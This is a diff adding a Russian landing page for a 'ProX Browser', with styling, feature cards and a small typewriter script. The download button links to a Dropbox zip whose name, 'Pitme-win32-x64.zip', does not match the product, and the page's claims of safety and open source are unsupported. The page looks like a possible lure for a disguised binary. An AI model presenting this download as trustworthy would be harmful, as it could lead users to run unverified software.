@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ProX Browser — Быстрый и легкий от CmdSfun</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --google-blue: #1a73e8;
+            --google-gray: #5f6368;
+            --pro-black: #202124;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #3c4043;
+            background-color: #fff;
+            overflow-x: hidden;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 8%;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(12px);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid #f1f3f4;
+        }
+
+        .logo {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--pro-black);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo span { color: var(--google-blue); margin-left: 5px; font-weight: 400; }
+
+        .logo-img {
+            height: 35px;
+            width: auto;
+            margin-right: 12px;
+            /* Инвертируем черный логотип в белый на темном фоне, 
+               но так как фон белый, оставляем как есть или добавляем легкую тень */
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+        }
+
+        .hero {
+            text-align: center;
+            padding: 140px 20px 100px;
+            background: radial-gradient(circle at 50% 100%, #e8f0fe 0%, #fff 50%);
+        }
+
+        .hero h1 {
+            font-size: clamp(36px, 7vw, 72px);
+            font-weight: 500;
+            margin-bottom: 25px;
+            color: var(--pro-black);
+            animation: fadeInUp 0.8s ease-out;
+        }
+
+        .typing-box {
+            color: var(--google-blue);
+            min-width: 200px;
+            display: inline-block;
+            text-align: left;
+            border-right: 3px solid var(--google-blue);
+            padding-right: 8px;
+            animation: caret 0.7s infinite;
+        }
+
+        @keyframes caret {
+            50% { border-color: transparent; }
+        }
+
+        .hero p {
+            font-size: 22px;
+            color: var(--google-gray);
+            max-width: 700px;
+            margin: 0 auto 45px;
+            opacity: 0;
+            animation: fadeInUp 0.8s ease-out 0.2s forwards;
+        }
+
+        .cta-group {
+            opacity: 0;
+            animation: fadeInUp 0.8s ease-out 0.4s forwards;
+        }
+
+        .btn-main {
+            display: inline-block;
+            background: var(--google-blue);
+            color: white;
+            padding: 20px 50px;
+            border-radius: 100px;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: 500;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 10px 20px rgba(26, 115, 232, 0.2);
+        }
+
+        .btn-main:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(26, 115, 232, 0.4);
+            background-color: #185abc;
+        }
+
+        .features {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            padding: 100px 10%;
+            flex-wrap: wrap;
+            background: white;
+        }
+
+        .card {
+            flex: 1;
+            min-width: 300px;
+            padding: 40px;
+            border-radius: 24px;
+            background: #fff;
+            border: 1px solid #f1f3f4;
+            transition: all 0.4s ease;
+        }
+
+        .card:hover {
+            border-color: var(--google-blue);
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.05);
+        }
+
+        footer {
+            padding: 60px 8%;
+            border-top: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #f8f9fa;
+        }
+
+        .dev-info {
+            font-weight: 500;
+            color: var(--pro-black);
+            text-decoration: none;
+            padding: 5px 10px;
+            border-radius: 6px;
+            transition: 0.3s;
+        }
+
+        .dev-info span { color: var(--google-blue); }
+        .dev-info:hover { background: #e8f0fe; }
+
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 42px; }
+            footer { flex-direction: column; gap: 30px; text-align: center; }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <a href="#" class="logo">
+        <img src="https://i.ibb.co/LXQRGX2r/logo.png" alt="ProX Logo" class="logo-img">
+        ProX <span>Browser</span>
+    </a>
+    <nav>
+        <a href="https://t.me/Djsoarobot" target="_blank" style="color: var(--google-blue); text-decoration: none; font-weight: 500; font-size: 14px; border: 1px solid var(--google-blue); padding: 8px 15px; border-radius: 6px;">Поддержка</a>
+    </nav>
+</header>
+
+<section class="hero">
+    <h1>ProX Browser — <span class="typing-box" id="typewriter"></span></h1>
+    <p>Легкий, открытый и невероятно быстрый инструмент от разработчика <b>CmdSfun</b>. Создан для тех, кто ценит производительность.</p>
+    
+    <div class="cta-group">
+        <a href="https://www.dropbox.com/scl/fi/p3m5v9nqo89hh9qarubay/Pitme-win32-x64.zip?rlkey=yku73o2midzey0p3iwf05im1q&st=ikpduuqg&dl=1" class="btn-main">Скачать ProX Browser</a>
+        <p style="font-size: 14px; margin-top: 20px; color: #9aa0a6;">Разработка: <b>CmdSfun</b> • Безопасно • Open Source</p>
+    </div>
+</section>
+
+<section class="features">
+    <div class="card">
+        <h3>🚀 Скорость</h3>
+        <p>ProX Browser оптимизирован для мгновенного отклика даже на старых устройствах.</p>
+    </div>
+    <div class="card">
+        <h3>🧊 Легкость</h3>
+        <p>Минимальное потребление ОЗУ. Работайте с десятками вкладок без тормозов.</p>
+    </div>
+    <div class="card">
+        <h3>📂 Прозрачность</h3>
+        <p>Полностью открытый исходный код. Никакой слежки и скрытой рекламы.</p>
+    </div>
+</section>
+
+<footer>
+    <a href="https://github.com/CmdSfun" class="dev-info" target="_blank">Developed by <span>CmdSfun</span></a>
+    <div style="color: var(--google-gray); font-size: 14px;">&copy; 2026 ProX Browser Project</div>
+    <a href="https://t.me/Djsoarobot" target="_blank" class="dev-info">Support <span>@Djsoarobot</span></a>
+</footer>
+
+<script>
+    const textElement = document.getElementById('typewriter');
+    const phrases = ['быстрый', 'легкий', 'опенсурс'];
+    let phraseIndex = 0;
+    let charIndex = 0;
+    let isDeleting = false;
+
+    function type() {
+        const currentPhrase = phrases[phraseIndex];
+        textElement.textContent = isDeleting 
+            ? currentPhrase.substring(0, charIndex - 1) 
+            : currentPhrase.substring(0, charIndex + 1);
+        
+        charIndex = isDeleting ? charIndex - 1 : charIndex + 1;
+        let speed = isDeleting ? 50 : 150;
+
+        if (!isDeleting && charIndex === currentPhrase.length) {
+            speed = 2000;
+            isDeleting = true;
+        } else if (isDeleting && charIndex === 0) {
+            isDeleting = false;
+            phraseIndex = (phraseIndex + 1) % phrases.length;
+            speed = 500;
+        }
+
+        setTimeout(type, speed);
+    }
+    window.onload = type;
+</script>
+
+</body>
+</html>o
